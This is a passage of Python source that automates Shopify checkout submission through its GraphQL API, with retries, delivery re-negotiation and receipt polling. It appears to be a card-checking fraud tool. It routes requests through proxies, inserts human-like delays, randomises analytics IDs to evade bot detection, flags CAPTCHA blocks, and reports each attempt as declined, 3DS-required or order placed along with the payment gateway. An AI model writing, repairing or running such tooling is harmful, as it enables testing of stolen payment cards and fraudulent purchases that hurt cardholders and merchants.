                                    # ─── destinationAddress (UNION response) → destination (INPUT) ───
                                    _rdest = _rdl.get('destinationAddress') or {}
                                    _rdest_type = _rdest.get('__typename', '') if _rdest else ''
                                    if _rdest_type in ('StreetAddress', 'PartialStreetAddress'):
                                        _rdl_entry['destination'] = {
                                            'streetAddress': {
                                                'firstName': '',
                                                'lastName': '',
                                                'address1': _rdest.get('address1') or '',
                                                'address2': _rdest.get('address2') or '',
                                                'city': _rdest.get('city') or '',
                                                'countryCode': _rdest.get('countryCode') or '',
                                                'zoneCode': _rdest.get('zoneCode') or '',
                                                'postalCode': _rdest.get('postalCode') or '',
                                                'phone': '',
                                            },
                                        }
                                    
                                    _rejected_delivery_lines.append(_rdl_entry)
                                print(f'[SUBMIT_REJECTED] Got {len(_rejected_delivery_lines)} delivery lines from sellerProposal', file=sys.stderr)
                            
                            # Also extract checkoutTotal from rejected sellerProposal
                            _rej_ct = _rejected_seller.get('checkoutTotal') or {}
                            if _rej_ct:
                                _rej_amt, _rej_cur = _extract_money(_rej_ct)
                                if _rej_amt and _rej_amt != '0':
                                    total_price = _rej_amt
                                    currency = _rej_cur or currency
                                    pp['payment']['totalAmount'] = {'value': {'amount': f'{total_price}', 'currencyCode': currency}}
                                    for _pl in pp['payment'].get('paymentLines', []):
                                        _pl['amount'] = {'value': {'amount': f'{total_price}', 'currencyCode': currency}}
                                    print(f'[SUBMIT_REJECTED] Updated total from sellerProposal: {total_price} {currency}', file=sys.stderr)
                        
                        # ─── PRE-RENEGOTIATION DELIVERY FIX ───
                        # ROOT CAUSE: The original submit sent targetMerchandiseLines: {lines: []}
                        # (empty list) which the server rejected with DELIVERY_DELIVERY_LINE_DETAIL_CHANGED.
                        # The re-negotiation below must NOT reuse the same broken pp['delivery'] —
                        # otherwise the server keeps returning the same warning and the retry submit
                        # ends up with inconsistent state, causing INTERNAL_SERVER_ERROR.
                        #
                        # FIX: Build corrected delivery terms from the SubmitRejected sellerProposal
                        # (which contains the EXACT delivery lines the server wants) and update
                        # pp['delivery'] BEFORE the re-negotiation. This way the re-negotiation
                        # sends the corrected delivery, the server updates its state, and the
                        # retry submit succeeds.
                        if is_shipping_required and _rejected_delivery_lines:
                            _pre_dl_list = []
                            for _pdl in _rejected_delivery_lines:
                                _pfdl = dict(_pdl)
                                if 'destination' not in _pfdl or not _pfdl.get('destination'):
                                    _pfdl['destination'] = {
                                        'streetAddress': {
                                            'firstName': firstName,
                                            'lastName': lastName,
                                            'address1': street,
                                            'address2': '',
                                            'city': city,
                                            'countryCode': country_code,
                                            'zoneCode': state,
                                            'postalCode': s_zip,
                                            'phone': phone,
                                        },
                                    }
                                else:
                                    _pdest = _pfdl.get('destination') or {}
                                    _psa = _pdest.get('streetAddress') or {}
                                    if not _psa.get('firstName'): _psa['firstName'] = firstName
                                    if not _psa.get('lastName'): _psa['lastName'] = lastName
                                    if not _psa.get('address1'): _psa['address1'] = street
                                    if _psa.get('address2') is None: _psa['address2'] = ''
                                    if not _psa.get('city'): _psa['city'] = city
                                    if not _psa.get('countryCode'): _psa['countryCode'] = country_code
                                    if not _psa.get('zoneCode'): _psa['zoneCode'] = state
                                    if not _psa.get('postalCode'): _psa['postalCode'] = s_zip
                                    if not _psa.get('phone'): _psa['phone'] = phone
                                    _pfdl['destination'] = {'streetAddress': _psa}
                                _pre_dl_list.append(_pfdl)
                            _pre_delivery_terms = _build_delivery_terms(
                                delivery_lines=_pre_dl_list,
                                no_delivery_required=[],
                            )
                            pp['delivery'] = _pre_delivery_terms
                            submit_data['variables']['input']['delivery'] = _pre_delivery_terms
                            print(f'[RENEG_PRE] Pre-applied corrected delivery from sellerProposal: {len(_pre_dl_list)} lines', file=sys.stderr)
                        
                        # Step A: Re-negotiate with current state
                        _reneg_data = {
                            'query': QUERY_PROPOSAL,
                            'variables': {
                                'input': {
                                    'purchaseProposal': pp,
                                    'queueToken': queue_token or '',
                                },
                            },
                            'operationName': 'Proposal',
                        }
                        
                        _reneg_resp, _ = await retry_on_429(
                            lambda: session.post(
                                graphql_url,
                                params={'operationName': 'Proposal'},
                                headers=checkout_web_headers,
                                json=_reneg_data,
                                proxy=proxy, timeout=20, allow_redirects=True
                            ),
                            step_name="renegotiate_before_submit", max_retries=2, base_delay=3.0, max_delay=12.0
                        )
                        
                        if _reneg_resp and _reneg_resp.status_code == 200:
                            _refresh_session_token(_reneg_resp)
                            try:
                                _reneg_json = json.loads(_reneg_resp.text)
                                _reneg_parsed = _parse_negotiate_response(_reneg_json)
                                if _reneg_parsed['queue_token']:
                                    queue_token = _reneg_parsed['queue_token']
                                if _reneg_parsed['session_token']:
                                    x_checkout_one_session_token = _reneg_parsed['session_token']
                                    checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
                                    checkout_web_headers['authorization'] = f'Bearer {x_checkout_one_session_token}'
                                # Update checkout total from re-negotiation
                                if _reneg_parsed['checkout_total'] and _reneg_parsed['checkout_total'] != '0':
                                    total_price = _reneg_parsed['checkout_total']
                                    currency = _reneg_parsed['checkout_total_currency']
                                    # Update payment amounts
                                    pp['payment']['totalAmount'] = {'value': {'amount': f'{total_price}', 'currencyCode': currency}}
                                    for _pl in pp['payment'].get('paymentLines', []):
                                        _pl['amount'] = {'value': {'amount': f'{total_price}', 'currencyCode': currency}}
                                if _reneg_parsed['payment_method_identifier']:
                                    payment_method_identifier = _reneg_parsed['payment_method_identifier']
                                if _reneg_parsed['stable_ids']:
                                    stable_ids = _reneg_parsed['stable_ids']
                                
                                # KEY FIX v3: Use server_delivery_lines DIRECTLY for re-negotiation
                                # delivery input. Do NOT rebuild using _build_delivery_line().
                                # The server returns its FilledDeliveryTerms with the EXACT structure
                                # it expects in the submit input. We must pass that structure back
                                # verbatim, only injecting destination if missing.
                                if is_shipping_required:
                                    # Priority: 
                                    # 1. Delivery lines from SubmitRejected sellerProposal (most authoritative)
                                    # 2. Delivery lines from re-negotiate response
                                    # 3. Fallback: build from scratch
                                    _reneg_server_dl = _reneg_parsed.get('server_delivery_lines', [])
                                    
                                    if _rejected_delivery_lines:
                                        # Use delivery lines from SubmitRejected — these are EXACTLY
                                        # what the server wants us to send back
                                        _use_dl = _rejected_delivery_lines
                                        print(f'[RENEG_DL] Using rejected seller delivery: {len(_use_dl)} lines', file=sys.stderr)
                                    elif _reneg_server_dl:
                                        # Use delivery lines from re-negotiate response
                                        _use_dl = _reneg_server_dl
                                        print(f'[RENEG_DL] Using re-negotiate server delivery: {len(_use_dl)} lines', file=sys.stderr)
                                    else:
                                        _use_dl = None
                                    
                                    if _use_dl:
                                        # Inject destination into each delivery line if missing
                                        _final_dl_list = []
                                        for _udl in _use_dl:
                                            _fdl = dict(_udl)
                                            if 'destination' not in _fdl or not _fdl.get('destination'):
                                                _fdl['destination'] = {
                                                    'streetAddress': {
                                                        'firstName': firstName,
                                                        'lastName': lastName,
                                                        'address1': street,
                                                        'address2': '',
                                                        'city': city,
                                                        'countryCode': country_code,
                                                        'zoneCode': state,
                                                        'postalCode': s_zip,
                                                        'phone': phone,
                                                    },
                                                }
                                            else:
                                                # Fill missing fields in existing destination
                                                _dest = _fdl.get('destination') or {}
                                                _sa = _dest.get('streetAddress') or {}
                                                if not _sa.get('firstName'): _sa['firstName'] = firstName
                                                if not _sa.get('lastName'): _sa['lastName'] = lastName
                                                if not _sa.get('address1'): _sa['address1'] = street
                                                if _sa.get('address2') is None: _sa['address2'] = ''
                                                if not _sa.get('city'): _sa['city'] = city
                                                if not _sa.get('countryCode'): _sa['countryCode'] = country_code
                                                if not _sa.get('zoneCode'): _sa['zoneCode'] = state
                                                if not _sa.get('postalCode'): _sa['postalCode'] = s_zip
                                                if not _sa.get('phone'): _sa['phone'] = phone
                                                _fdl['destination'] = {'streetAddress': _sa}
                                            _final_dl_list.append(_fdl)
                                        _new_delivery_terms = _build_delivery_terms(
                                            delivery_lines=_final_dl_list,
                                            no_delivery_required=[],
                                        )
                                        _reneg_handle = _dget(_use_dl[0], 'selectedDeliveryStrategy', 'deliveryStrategyByHandle', 'handle') if _use_dl else 'shipping'
                                        _reneg_price = None
                                        if _use_dl:
                                            _ep = _use_dl[0].get('expectedTotalPrice') or {}
                                            if _ep and 'value' in _ep:
                                                _reneg_price = (_ep.get('value') or {}).get('amount', '')
                                        print(f'[RENEG_DL] Server delivery: handle={_reneg_handle} price={_reneg_price}', file=sys.stderr)
                                    else:
                                        # Fallback: build from scratch (should rarely happen)
                                        _reneg_ship_amount = None
                                        if total_price and total_price != '0':
                                            try:
                                                _total_f = float(total_price)
                                                _price_f = float(price) if price else 0
                                                _ship_est = max(0, _total_f - _price_f)
                                                if _ship_est > 0:
                                                    _reneg_ship_amount = f'{_ship_est:.2f}'
                                            except (ValueError, TypeError):
                                                pass
                                        _reneg_handle = selected_handle
                                        if _reneg_parsed['shipping_strategies']:
                                            _handle_strategies = [s for s in _reneg_parsed['shipping_strategies'] if s.get('handle')]
                                            if _handle_strategies:
                                                _reneg_handle = _handle_strategies[0]['handle']
                                        _fallback_dl = _build_delivery_line(
                                            currency=currency,
                                            first_name=firstName,
                                            last_name=lastName,
                                            street=street,
                                            city=city,
                                            country_code=country_code,
                                            zone_code=state,
                                            postal_code=s_zip,
                                            phone=phone,
                                            shipping_handle=_reneg_handle,
                                            shipping_amount=_reneg_ship_amount,
                                        )
                                        if stable_ids:
                                            _fallback_dl['targetMerchandiseLines'] = {
                                                'lines': [{'stableId': sid} for sid in stable_ids]
                                            }
                                        _new_delivery_terms = _build_delivery_terms(
                                            delivery_lines=[_fallback_dl],
                                            no_delivery_required=[],
                                        )
                                        print(f'[RENEG_DL] Fallback built delivery: handle={_reneg_handle} price={_reneg_ship_amount}', file=sys.stderr)
                                    
                                    # Update in submit input
                                    submit_data['variables']['input']['delivery'] = _new_delivery_terms
                                    pp['delivery'] = _new_delivery_terms
                                    
                                # Update merchandise from re-negotiation (seller-confirmed)
                                if _reneg_parsed.get('seller_variant_id'):
                                    _svid = _reneg_parsed['seller_variant_id']
                                    if _svid.startswith('gid://shopify/ProductVariant/'):
                                        variant_id = _svid.split('/')[-1]
                                    else:
                                        variant_id = _svid
                                if _reneg_parsed.get('seller_price'):
                                    price = float(_reneg_parsed['seller_price'])
                                if _reneg_parsed.get('seller_title'):
                                    product_title = _reneg_parsed['seller_title']
                                # Rebuild merchandise lines with updated data (include digest to fix MERCHANDISE_SIGNATURE_MISMATCH)
                                if _reneg_parsed.get('seller_digest'):
                                    _seller_digest = _reneg_parsed['seller_digest']
                                _new_merch_line = _build_merchandise_line(
                                    variant_id=variant_id or product_id_for_cart,
                                    product_id=product_numeric_id,
                                    price=price,
                                    currency=currency,
                                    title=product_title,
                                    requires_shipping=requires_shipping,
                                    quantity=1,
                                    digest=_seller_digest or None,
                                )
                                _new_submit_merch_lines = []
                                if stable_ids:
                                    for sid in stable_ids:
                                        _ml = dict(_new_merch_line)
                                        _ml['stableId'] = sid
                                        _new_submit_merch_lines.append(_ml)
                                else:
                                    _new_submit_merch_lines = [_new_merch_line]
                                # Do NOT set merchandise in submit — omit it entirely (avoid MERCHANDISE_SIGNATURE_MISMATCH)
                                print(f'[RENEG] checkout_total={_reneg_parsed["checkout_total"]} errors={[e.get("code","") for e in _reneg_parsed["errors"][:3]]}', file=sys.stderr)
                            except (json.JSONDecodeError, KeyError, TypeError, AttributeError) as e:
                                print(f'[RENEG] Parse error: {e}', file=sys.stderr)
                        
                        await human_delay(min_sec=0.5, max_sec=1.5, step_name="renegotiate")
                        
                        # Step B: Retry submit with fresh attemptToken
                        print(f'[RETRY_SUBMIT_AMT] Sending totalAmount={pp.get("payment",{}).get("totalAmount")} in retry', file=sys.stderr)
                        attempt_token = str(uuid.uuid4())
                        submit_data['variables']['attemptToken'] = attempt_token
                        submit_data['variables']['input']['queueToken'] = queue_token or ''
                        submit_data['variables']['input']['sessionInput'] = {'sessionToken': x_checkout_one_session_token}
                        # Update payment in submit data
                        submit_data['variables']['input']['payment'] = pp.get('payment')
                        # Regenerate analytics.pageId so the retry is treated as a fresh request
                        # (reusing the same pageId can cause Shopify backend state confusion).
                        submit_data['variables']['analytics'] = {
                            'requestUrl': checkout_url,
                            'pageId': f'{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012x}',
                        }
                        
                        # Wait a bit longer for delivery to re-settle
                        await asyncio.sleep(1.5)
                        _retry_resp, _ = await retry_on_429(
                            lambda: session.post(
                                graphql_url,
                                params={'operationName': 'SubmitForCompletion'},
                                headers=checkout_web_headers,
                                json=submit_data,
                                proxy=proxy, timeout=20, allow_redirects=True
                            ),
                            step_name="submit_retry", max_retries=1, base_delay=3.0, max_delay=8.0
                        )
                        
                        if _retry_resp and _retry_resp.status_code == 200:
                            _retry_text = _retry_resp.text
                            print(f'[SUBMIT_RETRY] Response (first 500): {_retry_text[:500]}', file=sys.stderr)
                            _refresh_session_token(_retry_resp)
                            try:
                                _retry_json = json.loads(_retry_text)
                                _retry_result = (_retry_json.get("data") or {}).get("submitForCompletion") or {}
                                _retry_type = _retry_result.get('__typename', '')
                                
                                print(f'[SUBMIT_RETRY] __typename={_retry_type}', file=sys.stderr)
                                
                                if _retry_type in ('SubmitSuccess', 'SubmittedForCompletion'):
                                    _rr = _retry_result.get('receipt') or {}
                                    if _rr:
                                        receipt_id = _rr.get('id')
                                        if _rr.get('__typename') == 'FailedReceipt':
                                            pe = _rr.get('processingError') or {}
                                            _pe_type = pe.get('__typename', '') if pe else ''
                                            if _pe_type == 'InventoryClaimFailure':
                                                return False, "INVENTORY_CLAIM_FAILURE: Item out of stock during payment", gateway, total_price, currency
                                            if pe.get('hasOffsitePaymentMethod'):
                                                return True, "3DS_REQUIRED", gateway, total_price, currency
                                            _ext = _extract_payment_error_response(pe)
                                            return False, _ext or "CARD_DECLINED", gateway, total_price, currency
                                elif _retry_type == 'SubmitFailed':
                                    reason = _retry_result.get('reason', 'Unknown failure')
                                    return False, f"SUBMIT_FAILED: {reason}", gateway, total_price, currency
                                elif _retry_type == 'SubmitRejected':
                                    _rej_errs = _retry_result.get('errors', [])
                                    _rej_blocking = [e for e in _rej_errs if e.get('code', '') not in _NON_BLOCKING_CODES]
                                    if _rej_blocking:
                                        # Format: "CODE:message" so the real error code is preserved
                                        rej_msgs = []
                                        for e in _rej_blocking[:3]:
                                            _code = e.get('code', '') or (e.get('extensions') or {}).get('code', '') or 'UNKNOWN'
                                            _msg = e.get('localizedMessage') or e.get('message', '')
                                            _msg = (_msg[:120] if isinstance(_msg, str) else str(_msg)[:120])
                                            rej_msgs.append(f"{_code}:{_msg}" if _msg else _code)
                                        return False, f"SUBMIT_REJECTED: {'; '.join(rej_msgs)}", gateway, total_price, currency
                                    # Only non-blocking warnings — the submit may still have been
                                    # accepted. Try to extract receipt from the response.
                                    print(f'[SUBMIT_RETRY] Only non-blocking warnings — checking for receipt', file=sys.stderr)
                                    _rej_receipt = _retry_result.get('receipt') or {}
                                    if _rej_receipt:
                                        receipt_id = _rej_receipt.get('id')
                                        if _rej_receipt.get('__typename') == 'FailedReceipt':
                                            pe = _rej_receipt.get('processingError') or {}
                                            _ext = _extract_payment_error_response(pe)
                                            return False, _ext or "CARD_DECLINED", gateway, total_price, currency
                                    # Also check SubmitRejected sellerProposal for delivery lines
                                    # to use in a third attempt if needed
                                    if not receipt_id:
                                        _rej2_seller = _retry_result.get('sellerProposal') or {}
                                        if _rej2_seller:
                                            _rej2_delivery = _rej2_seller.get('delivery') or {}
                                            if _rej2_delivery.get('__typename') == 'FilledDeliveryTerms':
                                                print(f'[SUBMIT_RETRY] Got seller delivery from 2nd rejected — may need 3rd attempt', file=sys.stderr)
                                elif not _retry_type:
                                    # Check for GraphQL errors
                                    _retry_errors = _retry_json.get('errors', [])
                                    _retry_sfc_errors = _retry_result.get('errors', []) if _retry_result else []
                                    _all_retry_errors = _retry_errors + _retry_sfc_errors
                                    # Errors that should NOT be treated as a real SUBMIT_REJECTED:
                                    #   - INVALID_VARIABLE        : schema validation warning, retry-able
                                    #   - INTERNAL_SERVER_ERROR    : Shopify backend crashed (transient)
                                    #   - INTERNAL_ERROR           : same, different code path
                                    #   - *_NON_BLOCKING_CODES     : advisory warnings already filtered
                                    #                                in the initial submit (e.g. MERCHANDISE_SIGNATURE_MISMATCH,
                                    #                                DELIVERY_DELIVERY_LINE_DETAIL_CHANGED)
                                    # The previous filter had a Python operator-precedence bug:
                                    #   `code not in A and code not in B or 'MERCHANDISE_SIGNATURE' in str(e)`
                                    # parsed as `(code not in A and code not in B) or ('MERCHANDISE_SIGNATURE' in str(e))`,
                                    # which incorrectly marked MERCHANDISE_SIGNATURE_MISMATCH warnings as
                                    # blocking — re-introducing the very bug _NON_BLOCKING_CODES was meant to fix.
                                    # The fix below explicitly parenthesises so MERCHANDISE_SIGNATURE-* warnings
                                    # are excluded from blocking errors.
                                    _TRANSIENT_CODES = {'INTERNAL_SERVER_ERROR', 'INTERNAL_ERROR'}
                                    _RETRY_IGNORE_CODES = ({'INVALID_VARIABLE'} | _TRANSIENT_CODES | _NON_BLOCKING_CODES)
                                    _transient_errs = [e for e in _all_retry_errors
                                                       if (e.get('extensions') or {}).get('code', '') in _TRANSIENT_CODES]
                                    _blocking = []
                                    for e in _all_retry_errors:
                                        _ecode = (e.get('extensions') or {}).get('code', '') or e.get('code', '')
                                        _e_str = str(e)
                                        # Skip ignored codes
                                        if _ecode in _RETRY_IGNORE_CODES:
                                            continue
                                        # Skip MERCHANDISE_SIGNATURE substring matches (non-blocking warning)
                                        if 'MERCHANDISE_SIGNATURE' in _e_str:
                                            continue
                                        _blocking.append(e)
                                    if _transient_errs:
                                        _t_msgs = [f"{(e.get('extensions') or {}).get('code', '') or e.get('code', '')}:{e.get('message', str(e))[:120]}" for e in _transient_errs[:3]]
                                        return False, f"SHOPIFY_SERVER_ERROR: {'; '.join(_t_msgs)}", gateway, total_price, currency
                                    if _blocking:
                                        _blk_msgs = [f"{(e.get('extensions') or {}).get('code', '') or e.get('code', '') or 'UNKNOWN'}:{e.get('message', str(e))[:120]}" for e in _blocking[:3]]
                                        return False, f"SUBMIT_REJECTED: {'; '.join(_blk_msgs)}", gateway, total_price, currency
                            except (json.JSONDecodeError, KeyError, TypeError, AttributeError) as e:
                                print(f'[SUBMIT_RETRY] Parse error: {e}', file=sys.stderr)
                        
                        # ── SECOND retry: re-negotiate again + submit once more ────────────
                        if not receipt_id:
                            print(f'[SUBMIT_RETRY2] First retry gave no receipt — doing 2nd re-negotiate+submit', file=sys.stderr)
                            await asyncio.sleep(2.0)
                            _r2_data = {
                                'query': QUERY_PROPOSAL,
                                'variables': {
                                    'input': {
                                        'purchaseProposal': pp,
                                        'queueToken': queue_token or '',
                                    },
                                },
                                'operationName': 'Proposal',
                            }
                            _r2_resp, _ = await retry_on_429(
                                lambda: session.post(
                                    graphql_url,
                                    params={'operationName': 'Proposal'},
                                    headers=checkout_web_headers,
                                    json=_r2_data,
                                    proxy=proxy, timeout=20, allow_redirects=True
                                ),
                                step_name="renegotiate2", max_retries=1, base_delay=2.0, max_delay=6.0
                            )
                            if _r2_resp and _r2_resp.status_code == 200:
                                _refresh_session_token(_r2_resp)
                                try:
                                    _r2_json = json.loads(_r2_resp.text)
                                    _r2_parsed = _parse_negotiate_response(_r2_json)
                                    if _r2_parsed.get('queue_token'):
                                        queue_token = _r2_parsed['queue_token']
                                    if _r2_parsed.get('session_token'):
                                        x_checkout_one_session_token = _r2_parsed['session_token']
                                        checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
                                        checkout_web_headers['authorization'] = f'Bearer {x_checkout_one_session_token}'
                                    if _r2_parsed.get('checkout_total') and _r2_parsed['checkout_total'] != '0':
                                        total_price = _r2_parsed['checkout_total']
                                        currency = _r2_parsed.get('checkout_total_currency', currency)
                                        pp['payment']['totalAmount'] = {'value': {'amount': str(total_price), 'currencyCode': currency}}
                                        for _pl in pp['payment'].get('paymentLines', []):
                                            _pl['amount'] = {'value': {'amount': str(total_price), 'currencyCode': currency}}
                                    print(f'[SUBMIT_RETRY2] Re-negotiate total={total_price} errors={[e.get("code","") for e in _r2_parsed.get("errors",[])[:3]]}', file=sys.stderr)
                                except Exception as _r2e:
                                    print(f'[SUBMIT_RETRY2] Parse error: {_r2e}', file=sys.stderr)
                            
                            await asyncio.sleep(1.5)
                            _r2_attempt_token = str(uuid.uuid4())
                            submit_data['variables']['attemptToken'] = _r2_attempt_token
                            submit_data['variables']['input']['queueToken'] = queue_token or ''
                            submit_data['variables']['input']['sessionInput'] = {'sessionToken': x_checkout_one_session_token}
                            submit_data['variables']['input']['payment'] = pp.get('payment')
                            submit_data['variables']['analytics'] = {
                                'requestUrl': checkout_url,
                                'pageId': f'{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012x}',
                            }
                            _r2_submit_resp, _ = await retry_on_429(
                                lambda: session.post(
                                    graphql_url,
                                    params={'operationName': 'SubmitForCompletion'},
                                    headers=checkout_web_headers,
                                    json=submit_data,
                                    proxy=proxy, timeout=20, allow_redirects=True
                                ),
                                step_name="submit_retry2", max_retries=1, base_delay=3.0, max_delay=8.0
                            )
                            if _r2_submit_resp and _r2_submit_resp.status_code == 200:
                                _refresh_session_token(_r2_submit_resp)
                                print(f'[SUBMIT_RETRY2] Response: {_r2_submit_resp.text[:300]}', file=sys.stderr)
                                try:
                                    _r2s_json = json.loads(_r2_submit_resp.text)
                                    _r2s_result = (_r2s_json.get('data') or {}).get('submitForCompletion') or {}
                                    _r2s_type = _r2s_result.get('__typename', '')
                                    print(f'[SUBMIT_RETRY2] __typename={_r2s_type}', file=sys.stderr)
                                    if _r2s_type in ('SubmitSuccess', 'SubmittedForCompletion'):
                                        _r2r = _r2s_result.get('receipt') or {}
                                        if _r2r:
                                            receipt_id = _r2r.get('id')
                                            if _r2r.get('__typename') == 'FailedReceipt':
                                                pe = _r2r.get('processingError') or {}
                                                _pe_type = pe.get('__typename', '') if pe else ''
                                                if _pe_type == 'InventoryClaimFailure':
                                                    return False, "INVENTORY_CLAIM_FAILURE: Item out of stock during payment", gateway, total_price, currency
                                                if pe.get('hasOffsitePaymentMethod'):
                                                    return True, "3DS_REQUIRED", gateway, total_price, currency
                                                _ext = _extract_payment_error_response(pe)
                                                return False, _ext or "CARD_DECLINED", gateway, total_price, currency
                                    elif _r2s_type == 'SubmitFailed':
                                        pass  # Fall through to RECEIPT_EMPTY
                                    elif _r2s_type in ('CheckpointDenied',):
                                        return False, "CAPTCHA_BLOCK: CheckpointDenied on submit2", gateway, total_price, currency
                                except Exception as _r2se:
                                    print(f'[SUBMIT_RETRY2] Parse error: {_r2se}', file=sys.stderr)

                        if not receipt_id:
                            return False, "RECEIPT_EMPTY", gateway, total_price, currency

                except (json.JSONDecodeError, KeyError, TypeError, AttributeError) as e:
                    return False, f"SUBMIT_JSON_ERROR: {str(e)}", gateway, total_price, currency

            print(f'[STEP11] receipt_id={receipt_id} total_price={total_price}', file=sys.stderr)

            # ======== STEP 12: Poll for receipt via node(id:) ========
            # The old QUERY_POLL (receipt(id:...)) was broken — the GraphQL API
            # doesn't accept 'id' on 'receipt'. The error response text contained
            # "ProcessedReceipt" and "shopify_payments" in error messages, which
            # falsely matched string checks and returned ORDER_PLACED even for
            # declined cards.
            #
            # FIX: Use node(id:$receiptId) to query the receipt GID directly.
            # Parse JSON properly — NO fragile string matching.
            print(f'[STEP12] Polling via node() for receipt {receipt_id}', file=sys.stderr)
            await human_delay(min_sec=1.0, max_sec=2.0, step_name="poll_start")

            _poll_node = None
            _poll_receipt_type = ''

            for i in range(8):
                _poll_data = {
                    'query': QUERY_POLL,
                    'variables': {},
                    'operationName': 'PollForReceipt',
                }
                _poll_resp, _ = await retry_on_429(
                    lambda: session.post(
                        graphql_url,
                        params={'operationName': 'PollForReceipt'},
                        headers=checkout_web_headers,
                        json=_poll_data,
                        proxy=proxy, timeout=20, allow_redirects=True
                    ),
                    step_name="poll", max_retries=1, base_delay=3.0, max_delay=12.0
                )
                if not _poll_resp or _poll_resp.status_code != 200:
                    print(f'[POLL_{i}] HTTP {_poll_resp.status_code if _poll_resp else "no response"}', file=sys.stderr)
                    await asyncio.sleep(2 + i)
                    continue

                _refresh_session_token(_poll_resp)

                print(f'[POLL_{i}] RAW: {_poll_resp.text[:500]}', file=sys.stderr)

                try:
                    _poll_json = json.loads(_poll_resp.text)
                except json.JSONDecodeError:
                    print(f'[POLL_{i}] JSON parse error', file=sys.stderr)
                    await asyncio.sleep(2)
                    continue

                # Check for GraphQL errors
                _poll_errors = _poll_json.get('errors') or []
                if _poll_errors:
                    _err_msgs = [e.get('message', '')[:100] for e in _poll_errors[:3]]
                    print(f'[POLL_{i}] GraphQL errors: {_err_msgs}', file=sys.stderr)
                    # If there are errors, the node query might not be supported
                    # Fall back to returning what we have from the submit
                    if i < 3:
                        await asyncio.sleep(2 + i)
                        continue
                    break

                _poll_node = _dget(_poll_json, 'data', 'receipt') or {}
                _poll_receipt_type = _poll_node.get('__typename', '')
                print(f'[POLL_{i}] receipt __typename={_poll_receipt_type}', file=sys.stderr)

                if _poll_receipt_type in ('ProcessedReceipt', 'FailedReceipt', 'ActionRequiredReceipt', 'ReceiptNotFound', 'ProcessingRemoteCheckoutsReceipt'):
                    break
                if _poll_receipt_type == 'ProcessingReceipt' and i < 7:
                    _poll_delay_ms = _poll_node.get('pollDelay', 2000)
                    _wait_sec = min(_poll_delay_ms / 1000.0, 10.0)
                    print(f'[POLL_{i}] ProcessingReceipt - waiting {_wait_sec:.1f}s (pollDelay={_poll_delay_ms}ms)', file=sys.stderr)
                    await asyncio.sleep(_wait_sec)
                    continue
                if _poll_receipt_type == 'WaitingReceipt' and i < 7:
                    _poll_delay_ms = _poll_node.get('pollDelay', 3000)
                    _wait_sec = min(_poll_delay_ms / 1000.0, 10.0)
                    print(f'[POLL_{i}] WaitingReceipt (3DS/action needed) - waiting {_wait_sec:.1f}s (pollDelay={_poll_delay_ms}ms)', file=sys.stderr)
                    await asyncio.sleep(_wait_sec)
                    continue
                if not _poll_receipt_type and i < 7:
                    # node returned null — receipt might not be ready yet
                    await asyncio.sleep(2 + i)
                    continue
                break

            if not _poll_node:
                # node query didn't work — fall back to submit receipt type
                # The submit returned ProcessingReceipt, which means payment
                # is still being processed. We can't determine the final status.
                # Return the receipt type from the submit response.
                print(f'[POLL] node query failed — falling back to submit receipt type', file=sys.stderr)
                # Check the submit receipt type
                _submit_receipt_type = ''
                if _submit_result and isinstance(_submit_result, dict):
                    _sr = _submit_result.get('receipt') or {}
                    _submit_receipt_type = _sr.get('__typename', '')
                if _submit_receipt_type == 'FailedReceipt':
                    return False, "CARD_DECLINED", gateway, total_price, currency
                if _submit_receipt_type == 'ProcessedReceipt':
                    return True, "ORDER_PLACED", gateway, total_price, currency
                if _submit_receipt_type == 'ActionRequiredReceipt':
                    return True, "3DS_REQUIRED", gateway, total_price, currency
                # ProcessingReceipt — can't determine, return processing
                return False, "PAYMENT_PROCESSING: Unable to poll receipt status", gateway, total_price, currency

            # ── Parse the receipt from node() response ──
            if _poll_receipt_type == 'ProcessedReceipt':
                _order = _poll_node.get('order') or {}
                _order_id = _order.get('id', '')
                _order_url = _poll_node.get('orderStatusPageUrl', '')
                print(f'[POLL] ORDER_PLACED order_id={_order_id} url={_order_url}', file=sys.stderr)
                if _order_url:
                    return True, f"ORDER_PLACED: {_order_url}", gateway, total_price, currency
                return True, "ORDER_PLACED", gateway, total_price, currency

            if _poll_receipt_type == 'FailedReceipt':
                _pe = _poll_node.get('processingError') or {}
                _pe_type = _pe.get('__typename', '') if _pe else ''
                print(f'[POLL] CARD_DECLINED processingError={_pe} typename={_pe_type}', file=sys.stderr)
                # InventoryClaimFailure = item went out of stock during payment
                if _pe_type == 'InventoryClaimFailure':
                    return False, "INVENTORY_CLAIM_FAILURE: Item out of stock during payment", gateway, total_price, currency
                if _pe:
                    # Check for specific PaymentFailed fields
                    _pf_code = _pe.get('code', '')
                    _pf_msg = _pe.get('messageUntranslated', '')
                    _pf_offsite = _pe.get('hasOffsitePaymentMethod', False)
                    if _pf_offsite:
                        return True, "3DS_REQUIRED", gateway, total_price, currency
                    _ext = _extract_payment_error_response(_pe)
                    if _ext and _ext != 'UNKNOWN_PAYMENT_ERROR':
                        if _payment_requires_offsite_action(_pe):
                            return True, "3DS_REQUIRED", gateway, total_price, currency
                        return False, _ext, gateway, total_price, currency
                    # Fall back to __typename-based detection
                    if _pe_type in ('PaymentFailed', 'PurchaseOrderProcessingError'):
                        return False, "CARD_DECLINED", gateway, total_price, currency
                    if _pe_type:
                        return False, f"CARD_DECLINED: {_pe_type}", gateway, total_price, currency
                return False, "CARD_DECLINED", gateway, total_price, currency

            if _poll_receipt_type == 'ActionRequiredReceipt':
                return True, "3DS_REQUIRED", gateway, total_price, currency

            if _poll_receipt_type == 'ProcessingReceipt':
                return False, "PAYMENT_PROCESSING: Still processing after polling", gateway, total_price, currency

            if _poll_receipt_type == 'WaitingReceipt':
                # WaitingReceipt = 3DS authentication or external action required
                return True, "3DS_REQUIRED", gateway, total_price, currency

            if _poll_receipt_type == 'ProcessingRemoteCheckoutsReceipt':
                # Multi-store checkout being processed remotely
                return False, "PAYMENT_PROCESSING: Remote checkout processing", gateway, total_price, currency

            if _poll_receipt_type == 'ReceiptNotFound':
                # Receipt not found — session may have expired
                return False, "RECEIPT_NOT_FOUND: Receipt expired or not found", gateway, total_price, currency

            return False, f"UNKNOWN_RECEIPT: {_poll_receipt_type}", gateway, total_price, currency

